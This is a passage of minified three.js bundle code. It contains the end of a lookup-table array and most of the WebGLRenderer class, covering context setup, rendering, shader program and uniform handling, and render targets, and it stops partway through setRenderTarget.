,14826,5796,14678,5543,14527,5287,14377,4985,14133,4586,13869,4257,15360,1563,15360,1642,15358,2076,15354,2636,15341,3350,15317,4019,15273,4429,15203,4732,15105,4911,14981,4932,14836,4818,14679,4621,14517,4386,14359,4156,14083,3795,13808,3437,15360,122,15360,137,15358,285,15355,636,15344,1274,15322,2177,15281,2765,15215,3223,15120,3451,14995,3569,14846,3567,14681,3466,14511,3305,14344,3121,14037,2800,13753,2467,15360,0,15360,1,15359,21,15355,89,15346,253,15325,479,15287,796,15225,1148,15133,1492,15008,1749,14856,1882,14685,1886,14506,1783,14324,1608,13996,1398,13702,1183]);let Zn=null;function JA(){return Zn===null&&(Zn=new Gw(ZA,16,16,Ur,Li),Zn.name="DFG_LUT",Zn.minFilter=Kt,Zn.magFilter=Kt,Zn.wrapS=bi,Zn.wrapT=bi,Zn.generateMipmaps=!1,Zn.needsUpdate=!0),Zn}class g_{constructor(e={}){const{canvas:n=vw(),context:i=null,depth:s=!0,stencil:r=!1,alpha:a=!1,antialias:o=!1,premultipliedAlpha:l=!0,preserveDrawingBuffer:c=!1,powerPreference:d="default",failIfMajorPerformanceCaveat:p=!1,reversedDepthBuffer:h=!1,outputBufferType:f=Sn}=e;this.isWebGLRenderer=!0;let _;if(i!==null){if(typeof WebGLRenderingContext<"u"&&i instanceof WebGLRenderingContext)throw new Error("THREE.WebGLRenderer: WebGL 1 is not supported since r163.");_=i.getContextAttributes().alpha}else _=a;const y=f,m=new Set([dh,uh,ch]),u=new Set([Sn,li,ja,Xa,oh,lh]),g=new Uint32Array(4),x=new Int32Array(4);let S=null,T=null;const A=[],R=[];let N=null;this.domElement=n,this.debug={checkShaderErrors:!0,onShaderError:null},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.toneMapping=ri,this.toneMappingExposure=1,this.transmissionResolutionScale=1;const b=this;let w=!1;this._outputColorSpace=Pn;let P=0,z=0,V=null,Z=-1,$=null;const X=new Mt,H=new Mt;let I=null;const J=new Ie(0);let K=0,ne=n.width,we=n.height,Pe=1,Ge=null,Ke=null;const q=new Mt(0,0,ne,we),O=new Mt(0,0,ne,we);let ge=!1;const Ue=new gh;let ye=!1,Xe=!1;const Tt=new _t,Ve=new B,qe=new Mt,tt={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};let Oe=!1;function pt(){return V===null?Pe:1}let k=i;function yt(E,U){return n.getContext(E,U)}try{const E={alpha:!0,depth:s,stencil:r,antialias:o,premultipliedAlpha:l,preserveDrawingBuffer:c,powerPreference:d,failIfMajorPerformanceCaveat:p};if("setAttribute"in n&&n.setAttribute("data-engine",`three.js r${rh}`),n.addEventListener("webglcontextlost",De,!1),n.addEventListener("webglcontextrestored",ct,!1),n.addEventListener("webglcontextcreationerror",nt,!1),k===null){const U="webgl2";if(k=yt(U,E),k===null)throw yt(U)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}}catch(E){throw Qe("WebGLRenderer: "+E.message),E}let Ze,at,Se,C,v,L,Y,Q,j,Te,le,Me,ke,re,ue,be,Ee,ce,ze,D,fe,ae,me,ie;function te(){Ze=new J1(k),Ze.init(),ae=new GA(k,Ze),at=new G1(k,Ze,e,ae),Se=new VA(k,Ze),at.reversedDepthBuffer&&h&&Se.buffers.depth.setReversed(!0),C=new tT(k),v=new TA,L=new HA(k,Ze,Se,v,at,ae,C),Y=new j1(b),Q=new Z1(b),j=new rM(k),me=new V1(k,j),Te=new Q1(k,j,C,me),le=new iT(k,Te,j,C),ze=new nT(k,at,L),be=new W1(v),Me=new EA(b,Y,Q,Ze,at,me,be),ke=new $A(b,v),re=new CA,ue=new DA(Ze),ce=new z1(b,Y,Q,Se,le,_,l),Ee=new BA(b,le,at),ie=new KA(k,C,at,Se),D=new H1(k,Ze,C),fe=new eT(k,Ze,C),C.programs=Me.programs,b.capabilities=at,b.extensions=Ze,b.properties=v,b.renderLists=re,b.shadowMap=Ee,b.state=Se,b.info=C}te(),y!==Sn&&(N=new rT(y,n.width,n.height,s,r));const oe=new qA(b,k);this.xr=oe,this.getContext=function(){return k},this.getContextAttributes=function(){return k.getContextAttributes()},this.forceContextLoss=function(){const E=Ze.get("WEBGL_lose_context");E&&E.loseContext()},this.forceContextRestore=function(){const E=Ze.get("WEBGL_lose_context");E&&E.restoreContext()},this.getPixelRatio=function(){return Pe},this.setPixelRatio=function(E){E!==void 0&&(Pe=E,this.setSize(ne,we,!1))},this.getSize=function(E){return E.set(ne,we)},this.setSize=function(E,U,W=!0){if(oe.isPresenting){Ne("WebGLRenderer: Can't change size while VR device is presenting.");return}ne=E,we=U,n.width=Math.floor(E*Pe),n.height=Math.floor(U*Pe),W===!0&&(n.style.width=E+"px",n.style.height=U+"px"),N!==null&&N.setSize(n.width,n.height),this.setViewport(0,0,E,U)},this.getDrawingBufferSize=function(E){return E.set(ne*Pe,we*Pe).floor()},this.setDrawingBufferSize=function(E,U,W){ne=E,we=U,Pe=W,n.width=Math.floor(E*W),n.height=Math.floor(U*W),this.setViewport(0,0,E,U)},this.setEffects=function(E){if(y===Sn){console.error("THREE.WebGLRenderer: setEffects() requires outputBufferType set to HalfFloatType or FloatType.");return}if(E){for(let U=0;U<E.length;U++)if(E[U].isOutputPass===!0){console.warn("THREE.WebGLRenderer: OutputPass is not needed in setEffects(). Tone mapping and color space conversion are applied automatically.");break}}N.setEffects(E||[])},this.getCurrentViewport=function(E){return E.copy(X)},this.getViewport=function(E){return E.copy(q)},this.setViewport=function(E,U,W,G){E.isVector4?q.set(E.x,E.y,E.z,E.w):q.set(E,U,W,G),Se.viewport(X.copy(q).multiplyScalar(Pe).round())},this.getScissor=function(E){return E.copy(O)},this.setScissor=function(E,U,W,G){E.isVector4?O.set(E.x,E.y,E.z,E.w):O.set(E,U,W,G),Se.scissor(H.copy(O).multiplyScalar(Pe).round())},this.getScissorTest=function(){return ge},this.setScissorTest=function(E){Se.setScissorTest(ge=E)},this.setOpaqueSort=function(E){Ge=E},this.setTransparentSort=function(E){Ke=E},this.getClearColor=function(E){return E.copy(ce.getClearColor())},this.setClearColor=function(){ce.setClearColor(...arguments)},this.getClearAlpha=function(){return ce.getClearAlpha()},this.setClearAlpha=function(){ce.setClearAlpha(...arguments)},this.clear=function(E=!0,U=!0,W=!0){let G=0;if(E){let F=!1;if(V!==null){const de=V.texture.format;F=m.has(de)}if(F){const de=V.texture.type,ve=u.has(de),he=ce.getClearColor(),xe=ce.getClearAlpha(),Ae=he.r,Le=he.g,Ce=he.b;ve?(g[0]=Ae,g[1]=Le,g[2]=Ce,g[3]=xe,k.clearBufferuiv(k.COLOR,0,g)):(x[0]=Ae,x[1]=Le,x[2]=Ce,x[3]=xe,k.clearBufferiv(k.COLOR,0,x))}else G|=k.COLOR_BUFFER_BIT}U&&(G|=k.DEPTH_BUFFER_BIT),W&&(G|=k.STENCIL_BUFFER_BIT,this.state.buffers.stencil.setMask(4294967295)),k.clear(G)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){n.removeEventListener("webglcontextlost",De,!1),n.removeEventListener("webglcontextrestored",ct,!1),n.removeEventListener("webglcontextcreationerror",nt,!1),ce.dispose(),re.dispose(),ue.dispose(),v.dispose(),Y.dispose(),Q.dispose(),le.dispose(),me.dispose(),ie.dispose(),Me.dispose(),oe.dispose(),oe.removeEventListener("sessionstart",Sh),oe.removeEventListener("sessionend",bh),fs.stop()};function De(E){E.preventDefault(),im("WebGLRenderer: Context Lost."),w=!0}function ct(){im("WebGLRenderer: Context Restored."),w=!1;const E=C.autoReset,U=Ee.enabled,W=Ee.autoUpdate,G=Ee.needsUpdate,F=Ee.type;te(),C.autoReset=E,Ee.enabled=U,Ee.autoUpdate=W,Ee.needsUpdate=G,Ee.type=F}function nt(E){Qe("WebGLRenderer: A WebGL context could not be created. Reason: ",E.statusMessage)}function $n(E){const U=E.target;U.removeEventListener("dispose",$n),di(U)}function di(E){v_(E),v.remove(E)}function v_(E){const U=v.get(E).programs;U!==void 0&&(U.forEach(function(W){Me.releaseProgram(W)}),E.isShaderMaterial&&Me.releaseShaderCache(E))}this.renderBufferDirect=function(E,U,W,G,F,de){U===null&&(U=tt);const ve=F.isMesh&&F.matrixWorld.determinant()<0,he=x_(E,U,W,G,F);Se.setMaterial(G,ve);let xe=W.index,Ae=1;if(G.wireframe===!0){if(xe=Te.getWireframeAttribute(W),xe===void 0)return;Ae=2}const Le=W.drawRange,Ce=W.attributes.position;let He=Le.start*Ae,ot=(Le.start+Le.count)*Ae;de!==null&&(He=Math.max(He,de.start*Ae),ot=Math.min(ot,(de.start+de.count)*Ae)),xe!==null?(He=Math.max(He,0),ot=Math.min(ot,xe.count)):Ce!=null&&(He=Math.max(He,0),ot=Math.min(ot,Ce.count));const St=ot-He;if(St<0||St===1/0)return;me.setup(F,G,he,W,xe);let bt,lt=D;if(xe!==null&&(bt=j.get(xe),lt=fe,lt.setIndex(bt)),F.isMesh)G.wireframe===!0?(Se.setLineWidth(G.wireframeLinewidth*pt()),lt.setMode(k.LINES)):lt.setMode(k.TRIANGLES);else if(F.isLine){let Re=G.linewidth;Re===void 0&&(Re=1),Se.setLineWidth(Re*pt()),F.isLineSegments?lt.setMode(k.LINES):F.isLineLoop?lt.setMode(k.LINE_LOOP):lt.setMode(k.LINE_STRIP)}else F.isPoints?lt.setMode(k.POINTS):F.isSprite&&lt.setMode(k.TRIANGLES);if(F.isBatchedMesh)if(F._multiDrawInstances!==null)qa("WebGLRenderer: renderMultiDrawInstances has been deprecated and will be removed in r184. Append to renderMultiDraw arguments and use indirection."),lt.renderMultiDrawInstances(F._multiDrawStarts,F._multiDrawCounts,F._multiDrawCount,F._multiDrawInstances);else if(Ze.get("WEBGL_multi_draw"))lt.renderMultiDraw(F._multiDrawStarts,F._multiDrawCounts,F._multiDrawCount);else{const Re=F._multiDrawStarts,it=F._multiDrawCounts,Je=F._multiDrawCount,gn=xe?j.get(xe).bytesPerElement:1,Ws=v.get(G).currentProgram.getUniforms();for(let vn=0;vn<Je;vn++)Ws.setValue(k,"_gl_DrawID",vn),lt.render(Re[vn]/gn,it[vn])}else if(F.isInstancedMesh)lt.renderInstances(He,St,F.count);else if(W.isInstancedBufferGeometry){const Re=W._maxInstanceCount!==void 0?W._maxInstanceCount:1/0,it=Math.min(W.instanceCount,Re);lt.renderInstances(He,St,it)}else lt.render(He,St)};function yh(E,U,W){E.transparent===!0&&E.side===xi&&E.forceSinglePass===!1?(E.side=mn,E.needsUpdate=!0,lo(E,U,W),E.side=cs,E.needsUpdate=!0,lo(E,U,W),E.side=xi):lo(E,U,W)}this.compile=function(E,U,W=null){W===null&&(W=E),T=ue.get(W),T.init(U),R.push(T),W.traverseVisible(function(F){F.isLight&&F.layers.test(U.layers)&&(T.pushLight(F),F.castShadow&&T.pushShadow(F))}),E!==W&&E.traverseVisible(function(F){F.isLight&&F.layers.test(U.layers)&&(T.pushLight(F),F.castShadow&&T.pushShadow(F))}),T.setupLights();const G=new Set;return E.traverse(function(F){if(!(F.isMesh||F.isPoints||F.isLine||F.isSprite))return;const de=F.material;if(de)if(Array.isArray(de))for(let ve=0;ve<de.length;ve++){const he=de[ve];yh(he,W,F),G.add(he)}else yh(de,W,F),G.add(de)}),T=R.pop(),G},this.compileAsync=function(E,U,W=null){const G=this.compile(E,U,W);return new Promise(F=>{function de(){if(G.forEach(function(ve){v.get(ve).currentProgram.isReady()&&G.delete(ve)}),G.size===0){F(E);return}setTimeout(de,10)}Ze.get("KHR_parallel_shader_compile")!==null?de():setTimeout(de,10)})};let uc=null;function __(E){uc&&uc(E)}function Sh(){fs.stop()}function bh(){fs.start()}const fs=new d_;fs.setAnimationLoop(__),typeof self<"u"&&fs.setContext(self),this.setAnimationLoop=function(E){uc=E,oe.setAnimationLoop(E),E===null?fs.stop():fs.start()},oe.addEventListener("sessionstart",Sh),oe.addEventListener("sessionend",bh),this.render=function(E,U){if(U!==void 0&&U.isCamera!==!0){Qe("WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}if(w===!0)return;const W=oe.enabled===!0&&oe.isPresenting===!0,G=N!==null&&(V===null||W)&&N.begin(b,V);if(E.matrixWorldAutoUpdate===!0&&E.updateMatrixWorld(),U.parent===null&&U.matrixWorldAutoUpdate===!0&&U.updateMatrixWorld(),oe.enabled===!0&&oe.isPresenting===!0&&(N===null||N.isCompositing()===!1)&&(oe.cameraAutoUpdate===!0&&oe.updateCamera(U),U=oe.getCamera()),E.isScene===!0&&E.onBeforeRender(b,E,U,V),T=ue.get(E,R.length),T.init(U),R.push(T),Tt.multiplyMatrices(U.projectionMatrix,U.matrixWorldInverse),Ue.setFromProjectionMatrix(Tt,ni,U.reversedDepth),Xe=this.localClippingEnabled,ye=be.init(this.clippingPlanes,Xe),S=re.get(E,A.length),S.init(),A.push(S),oe.enabled===!0&&oe.isPresenting===!0){const ve=b.xr.getDepthSensingMesh();ve!==null&&dc(ve,U,-1/0,b.sortObjects)}dc(E,U,0,b.sortObjects),S.finish(),b.sortObjects===!0&&S.sort(Ge,Ke),Oe=oe.enabled===!1||oe.isPresenting===!1||oe.hasDepthSensing()===!1,Oe&&ce.addToRenderList(S,E),this.info.render.frame++,ye===!0&&be.beginShadows();const F=T.state.shadowsArray;if(Ee.render(F,E,U),ye===!0&&be.endShadows(),this.info.autoReset===!0&&this.info.reset(),(G&&N.hasRenderPass())===!1){const ve=S.opaque,he=S.transmissive;if(T.setupLights(),U.isArrayCamera){const xe=U.cameras;if(he.length>0)for(let Ae=0,Le=xe.length;Ae<Le;Ae++){const Ce=xe[Ae];Mh(ve,he,E,Ce)}Oe&&ce.render(E);for(let Ae=0,Le=xe.length;Ae<Le;Ae++){const Ce=xe[Ae];wh(S,E,Ce,Ce.viewport)}}else he.length>0&&Mh(ve,he,E,U),Oe&&ce.render(E),wh(S,E,U)}V!==null&&z===0&&(L.updateMultisampleRenderTarget(V),L.updateRenderTargetMipmap(V)),G&&N.end(b),E.isScene===!0&&E.onAfterRender(b,E,U),me.resetDefaultState(),Z=-1,$=null,R.pop(),R.length>0?(T=R[R.length-1],ye===!0&&be.setGlobalState(b.clippingPlanes,T.state.camera)):T=null,A.pop(),A.length>0?S=A[A.length-1]:S=null};function dc(E,U,W,G){if(E.visible===!1)return;if(E.layers.test(U.layers)){if(E.isGroup)W=E.renderOrder;else if(E.isLOD)E.autoUpdate===!0&&E.update(U);else if(E.isLight)T.pushLight(E),E.castShadow&&T.pushShadow(E);else if(E.isSprite){if(!E.frustumCulled||Ue.intersectsSprite(E)){G&&qe.setFromMatrixPosition(E.matrixWorld).applyMatrix4(Tt);const ve=le.update(E),he=E.material;he.visible&&S.push(E,ve,he,W,qe.z,null)}}else if((E.isMesh||E.isLine||E.isPoints)&&(!E.frustumCulled||Ue.intersectsObject(E))){const ve=le.update(E),he=E.material;if(G&&(E.boundingSphere!==void 0?(E.boundingSphere===null&&E.computeBoundingSphere(),qe.copy(E.boundingSphere.center)):(ve.boundingSphere===null&&ve.computeBoundingSphere(),qe.copy(ve.boundingSphere.center)),qe.applyMatrix4(E.matrixWorld).applyMatrix4(Tt)),Array.isArray(he)){const xe=ve.groups;for(let Ae=0,Le=xe.length;Ae<Le;Ae++){const Ce=xe[Ae],He=he[Ce.materialIndex];He&&He.visible&&S.push(E,ve,He,W,qe.z,Ce)}}else he.visible&&S.push(E,ve,he,W,qe.z,null)}}const de=E.children;for(let ve=0,he=de.length;ve<he;ve++)dc(de[ve],U,W,G)}function wh(E,U,W,G){const{opaque:F,transmissive:de,transparent:ve}=E;T.setupLightsView(W),ye===!0&&be.setGlobalState(b.clippingPlanes,W),G&&Se.viewport(X.copy(G)),F.length>0&&oo(F,U,W),de.length>0&&oo(de,U,W),ve.length>0&&oo(ve,U,W),Se.buffers.depth.setTest(!0),Se.buffers.depth.setMask(!0),Se.buffers.color.setMask(!0),Se.setPolygonOffset(!1)}function Mh(E,U,W,G){if((W.isScene===!0?W.overrideMaterial:null)!==null)return;if(T.state.transmissionRenderTarget[G.id]===void 0){const He=Ze.has("EXT_color_buffer_half_float")||Ze.has("EXT_color_buffer_float");T.state.transmissionRenderTarget[G.id]=new ai(1,1,{generateMipmaps:!0,type:He?Li:Sn,minFilter:Ps,samples:at.samples,stencilBuffer:r,resolveDepthBuffer:!1,resolveStencilBuffer:!1,colorSpace:Ye.workingColorSpace})}const de=T.state.transmissionRenderTarget[G.id],ve=G.viewport||X;de.setSize(ve.z*b.transmissionResolutionScale,ve.w*b.transmissionResolutionScale);const he=b.getRenderTarget(),xe=b.getActiveCubeFace(),Ae=b.getActiveMipmapLevel();b.setRenderTarget(de),b.getClearColor(J),K=b.getClearAlpha(),K<1&&b.setClearColor(16777215,.5),b.clear(),Oe&&ce.render(W);const Le=b.toneMapping;b.toneMapping=ri;const Ce=G.viewport;if(G.viewport!==void 0&&(G.viewport=void 0),T.setupLightsView(G),ye===!0&&be.setGlobalState(b.clippingPlanes,G),oo(E,W,G),L.updateMultisampleRenderTarget(de),L.updateRenderTargetMipmap(de),Ze.has("WEBGL_multisampled_render_to_texture")===!1){let He=!1;for(let ot=0,St=U.length;ot<St;ot++){const bt=U[ot],{object:lt,geometry:Re,material:it,group:Je}=bt;if(it.side===xi&&lt.layers.test(G.layers)){const gn=it.side;it.side=mn,it.needsUpdate=!0,Eh(lt,W,G,Re,it,Je),it.side=gn,it.needsUpdate=!0,He=!0}}He===!0&&(L.updateMultisampleRenderTarget(de),L.updateRenderTargetMipmap(de))}b.setRenderTarget(he,xe,Ae),b.setClearColor(J,K),Ce!==void 0&&(G.viewport=Ce),b.toneMapping=Le}function oo(E,U,W){const G=U.isScene===!0?U.overrideMaterial:null;for(let F=0,de=E.length;F<de;F++){const ve=E[F],{object:he,geometry:xe,group:Ae}=ve;let Le=ve.material;Le.allowOverride===!0&&G!==null&&(Le=G),he.layers.test(W.layers)&&Eh(he,U,W,xe,Le,Ae)}}function Eh(E,U,W,G,F,de){E.onBeforeRender(b,U,W,G,F,de),E.modelViewMatrix.multiplyMatrices(W.matrixWorldInverse,E.matrixWorld),E.normalMatrix.getNormalMatrix(E.modelViewMatrix),F.onBeforeRender(b,U,W,G,E,de),F.transparent===!0&&F.side===xi&&F.forceSinglePass===!1?(F.side=mn,F.needsUpdate=!0,b.renderBufferDirect(W,U,G,F,E,de),F.side=cs,F.needsUpdate=!0,b.renderBufferDirect(W,U,G,F,E,de),F.side=xi):b.renderBufferDirect(W,U,G,F,E,de),E.onAfterRender(b,U,W,G,F,de)}function lo(E,U,W){U.isScene!==!0&&(U=tt);const G=v.get(E),F=T.state.lights,de=T.state.shadowsArray,ve=F.state.version,he=Me.getParameters(E,F.state,de,U,W),xe=Me.getProgramCacheKey(he);let Ae=G.programs;G.environment=E.isMeshStandardMaterial?U.environment:null,G.fog=U.fog,G.envMap=(E.isMeshStandardMaterial?Q:Y).get(E.envMap||G.environment),G.envMapRotation=G.environment!==null&&E.envMap===null?U.environmentRotation:E.envMapRotation,Ae===void 0&&(E.addEventListener("dispose",$n),Ae=new Map,G.programs=Ae);let Le=Ae.get(xe);if(Le!==void 0){if(G.currentProgram===Le&&G.lightsStateVersion===ve)return Ah(E,he),Le}else he.uniforms=Me.getUniforms(E),E.onBeforeCompile(he,b),Le=Me.acquireProgram(he,xe),Ae.set(xe,Le),G.uniforms=he.uniforms;const Ce=G.uniforms;return(!E.isShaderMaterial&&!E.isRawShaderMaterial||E.clipping===!0)&&(Ce.clippingPlanes=be.uniform),Ah(E,he),G.needsLights=S_(E),G.lightsStateVersion=ve,G.needsLights&&(Ce.ambientLightColor.value=F.state.ambient,Ce.lightProbe.value=F.state.probe,Ce.directionalLights.value=F.state.directional,Ce.directionalLightShadows.value=F.state.directionalShadow,Ce.spotLights.value=F.state.spot,Ce.spotLightShadows.value=F.state.spotShadow,Ce.rectAreaLights.value=F.state.rectArea,Ce.ltc_1.value=F.state.rectAreaLTC1,Ce.ltc_2.value=F.state.rectAreaLTC2,Ce.pointLights.value=F.state.point,Ce.pointLightShadows.value=F.state.pointShadow,Ce.hemisphereLights.value=F.state.hemi,Ce.directionalShadowMap.value=F.state.directionalShadowMap,Ce.directionalShadowMatrix.value=F.state.directionalShadowMatrix,Ce.spotShadowMap.value=F.state.spotShadowMap,Ce.spotLightMatrix.value=F.state.spotLightMatrix,Ce.spotLightMap.value=F.state.spotLightMap,Ce.pointShadowMap.value=F.state.pointShadowMap,Ce.pointShadowMatrix.value=F.state.pointShadowMatrix),G.currentProgram=Le,G.uniformsList=null,Le}function Th(E){if(E.uniformsList===null){const U=E.currentProgram.getUniforms();E.uniformsList=pl.seqWithValue(U.seq,E.uniforms)}return E.uniformsList}function Ah(E,U){const W=v.get(E);W.outputColorSpace=U.outputColorSpace,W.batching=U.batching,W.batchingColor=U.batchingColor,W.instancing=U.instancing,W.instancingColor=U.instancingColor,W.instancingMorph=U.instancingMorph,W.skinning=U.skinning,W.morphTargets=U.morphTargets,W.morphNormals=U.morphNormals,W.morphColors=U.morphColors,W.morphTargetsCount=U.morphTargetsCount,W.numClippingPlanes=U.numClippingPlanes,W.numIntersection=U.numClipIntersection,W.vertexAlphas=U.vertexAlphas,W.vertexTangents=U.vertexTangents,W.toneMapping=U.toneMapping}function x_(E,U,W,G,F){U.isScene!==!0&&(U=tt),L.resetTextureUnits();const de=U.fog,ve=G.isMeshStandardMaterial?U.environment:null,he=V===null?b.outputColorSpace:V.isXRRenderTarget===!0?V.texture.colorSpace:Or,xe=(G.isMeshStandardMaterial?Q:Y).get(G.envMap||ve),Ae=G.vertexColors===!0&&!!W.attributes.color&&W.attributes.color.itemSize===4,Le=!!W.attributes.tangent&&(!!G.normalMap||G.anisotropy>0),Ce=!!W.morphAttributes.position,He=!!W.morphAttributes.normal,ot=!!W.morphAttributes.color;let St=ri;G.toneMapped&&(V===null||V.isXRRenderTarget===!0)&&(St=b.toneMapping);const bt=W.morphAttributes.position||W.morphAttributes.normal||W.morphAttributes.color,lt=bt!==void 0?bt.length:0,Re=v.get(G),it=T.state.lights;if(ye===!0&&(Xe===!0||E!==$)){const Qt=E===$&&G.id===Z;be.setState(G,E,Qt)}let Je=!1;G.version===Re.__version?(Re.needsLights&&Re.lightsStateVersion!==it.state.version||Re.outputColorSpace!==he||F.isBatchedMesh&&Re.batching===!1||!F.isBatchedMesh&&Re.batching===!0||F.isBatchedMesh&&Re.batchingColor===!0&&F.colorTexture===null||F.isBatchedMesh&&Re.batchingColor===!1&&F.colorTexture!==null||F.isInstancedMesh&&Re.instancing===!1||!F.isInstancedMesh&&Re.instancing===!0||F.isSkinnedMesh&&Re.skinning===!1||!F.isSkinnedMesh&&Re.skinning===!0||F.isInstancedMesh&&Re.instancingColor===!0&&F.instanceColor===null||F.isInstancedMesh&&Re.instancingColor===!1&&F.instanceColor!==null||F.isInstancedMesh&&Re.instancingMorph===!0&&F.morphTexture===null||F.isInstancedMesh&&Re.instancingMorph===!1&&F.morphTexture!==null||Re.envMap!==xe||G.fog===!0&&Re.fog!==de||Re.numClippingPlanes!==void 0&&(Re.numClippingPlanes!==be.numPlanes||Re.numIntersection!==be.numIntersection)||Re.vertexAlphas!==Ae||Re.vertexTangents!==Le||Re.morphTargets!==Ce||Re.morphNormals!==He||Re.morphColors!==ot||Re.toneMapping!==St||Re.morphTargetsCount!==lt)&&(Je=!0):(Je=!0,Re.__version=G.version);let gn=Re.currentProgram;Je===!0&&(gn=lo(G,U,F));let Ws=!1,vn=!1,Xr=!1;const ut=gn.getUniforms(),an=Re.uniforms;if(Se.useProgram(gn.program)&&(Ws=!0,vn=!0,Xr=!0),G.id!==Z&&(Z=G.id,vn=!0),Ws||$!==E){Se.buffers.depth.getReversed()&&E.reversedDepth!==!0&&(E._reversedDepth=!0,E.updateProjectionMatrix()),ut.setValue(k,"projectionMatrix",E.projectionMatrix),ut.setValue(k,"viewMatrix",E.matrixWorldInverse);const on=ut.map.cameraPosition;on!==void 0&&on.setValue(k,Ve.setFromMatrixPosition(E.matrixWorld)),at.logarithmicDepthBuffer&&ut.setValue(k,"logDepthBufFC",2/(Math.log(E.far+1)/Math.LN2)),(G.isMeshPhongMaterial||G.isMeshToonMaterial||G.isMeshLambertMaterial||G.isMeshBasicMaterial||G.isMeshStandardMaterial||G.isShaderMaterial)&&ut.setValue(k,"isOrthographic",E.isOrthographicCamera===!0),$!==E&&($=E,vn=!0,Xr=!0)}if(Re.needsLights&&(it.state.directionalShadowMap.length>0&&ut.setValue(k,"directionalShadowMap",it.state.directionalShadowMap,L),it.state.spotShadowMap.length>0&&ut.setValue(k,"spotShadowMap",it.state.spotShadowMap,L),it.state.pointShadowMap.length>0&&ut.setValue(k,"pointShadowMap",it.state.pointShadowMap,L)),F.isSkinnedMesh){ut.setOptional(k,F,"bindMatrix"),ut.setOptional(k,F,"bindMatrixInverse");const Qt=F.skeleton;Qt&&(Qt.boneTexture===null&&Qt.computeBoneTexture(),ut.setValue(k,"boneTexture",Qt.boneTexture,L))}F.isBatchedMesh&&(ut.setOptional(k,F,"batchingTexture"),ut.setValue(k,"batchingTexture",F._matricesTexture,L),ut.setOptional(k,F,"batchingIdTexture"),ut.setValue(k,"batchingIdTexture",F._indirectTexture,L),ut.setOptional(k,F,"batchingColorTexture"),F._colorsTexture!==null&&ut.setValue(k,"batchingColorTexture",F._colorsTexture,L));const Cn=W.morphAttributes;if((Cn.position!==void 0||Cn.normal!==void 0||Cn.color!==void 0)&&ze.update(F,W,gn),(vn||Re.receiveShadow!==F.receiveShadow)&&(Re.receiveShadow=F.receiveShadow,ut.setValue(k,"receiveShadow",F.receiveShadow)),G.isMeshGouraudMaterial&&G.envMap!==null&&(an.envMap.value=xe,an.flipEnvMap.value=xe.isCubeTexture&&xe.isRenderTargetTexture===!1?-1:1),G.isMeshStandardMaterial&&G.envMap===null&&U.environment!==null&&(an.envMapIntensity.value=U.environmentIntensity),an.dfgLUT!==void 0&&(an.dfgLUT.value=JA()),vn&&(ut.setValue(k,"toneMappingExposure",b.toneMappingExposure),Re.needsLights&&y_(an,Xr),de&&G.fog===!0&&ke.refreshFogUniforms(an,de),ke.refreshMaterialUniforms(an,G,Pe,we,T.state.transmissionRenderTarget[E.id]),pl.upload(k,Th(Re),an,L)),G.isShaderMaterial&&G.uniformsNeedUpdate===!0&&(pl.upload(k,Th(Re),an,L),G.uniformsNeedUpdate=!1),G.isSpriteMaterial&&ut.setValue(k,"center",F.center),ut.setValue(k,"modelViewMatrix",F.modelViewMatrix),ut.setValue(k,"normalMatrix",F.normalMatrix),ut.setValue(k,"modelMatrix",F.matrixWorld),G.isShaderMaterial||G.isRawShaderMaterial){const Qt=G.uniformsGroups;for(let on=0,pc=Qt.length;on<pc;on++){const ms=Qt[on];ie.update(ms,gn),ie.bind(ms,gn)}}return gn}function y_(E,U){E.ambientLightColor.needsUpdate=U,E.lightProbe.needsUpdate=U,E.directionalLights.needsUpdate=U,E.directionalLightShadows.needsUpdate=U,E.pointLights.needsUpdate=U,E.pointLightShadows.needsUpdate=U,E.spotLights.needsUpdate=U,E.spotLightShadows.needsUpdate=U,E.rectAreaLights.needsUpdate=U,E.hemisphereLights.needsUpdate=U}function S_(E){return E.isMeshLambertMaterial||E.isMeshToonMaterial||E.isMeshPhongMaterial||E.isMeshStandardMaterial||E.isShadowMaterial||E.isShaderMaterial&&E.lights===!0}this.getActiveCubeFace=function(){return P},this.getActiveMipmapLevel=function(){return z},this.getRenderTarget=function(){return V},this.setRenderTargetTextures=function(E,U,W){const G=v.get(E);G.__autoAllocateDepthBuffer=E.resolveDepthBuffer===!1,G.__autoAllocateDepthBuffer===!1&&(G.__useRenderToTexture=!1),v.get(E.texture).__webglTexture=U,v.get(E.depthTexture).__webglTexture=G.__autoAllocateDepthBuffer?void 0:W,G.__hasExternalTextures=!0},this.setRenderTargetFramebuffer=function(E,U){const W=v.get(E);W.__webglFramebuffer=U,W.__useDefaultFramebuffer=U===void 0};const b_=k.createFramebuffer();this.setRenderTarget=function(E,U=0,W=0){V=E,P=U,z=W;let G=null,F=!1,de=!1;if(E){const he=v.get(E);if(he.__useDefaultFramebuffer!==void 0){Se.bindFramebuffer(k.FRAMEBUFFER,he.__webglFramebuffer),X.copy(E.viewport),H.copy(E.scissor),I=E.scissorTest,Se.viewport(X),Se.scissor(H),Se.setScissorTest(I),Z=-1;return}else if(he.__webglFramebuffer===void 0)L.setupRenderTarget(E);else if(he.__hasExternalTextures)L.rebindTextures(E,v.get(E.texture).__webglTexture,v.get(E.depthTexture).__webglTexture);else if(E.depthBuffer){const Le=E.depthTexture;if(he.__boundDepthTexture!==Le){if(Le!==null&&v.has(Le)&&(E.width!==Le.image.width||E.height!==Le.image.height))throw new Error("WebGLRenderTarget: Attached DepthTexture is initialized to the incorrect size.");L.setupDepthRenderbuffer(E)}}const xe=E.texture;(xe.isData3DTexture||xe.isDataArrayTexture||xe.isCompressedArrayTexture)&&(de=!0);const Ae=v.get(E).__webglFramebuffer;E.isWebGLCubeRenderTarget?(Array.isArray(Ae[U])?G=Ae[U][W]:G=Ae[U],F=!0):E.samples>0&&L.useMultisampledRTT(E)===!1?G=v.get(E).__webglMultisampledFramebuffer:Array.isArray(Ae)?G=Ae[W]:G=Ae,X.copy(E.viewport),H.copy(E.scissor),I=E.scissorTest}else 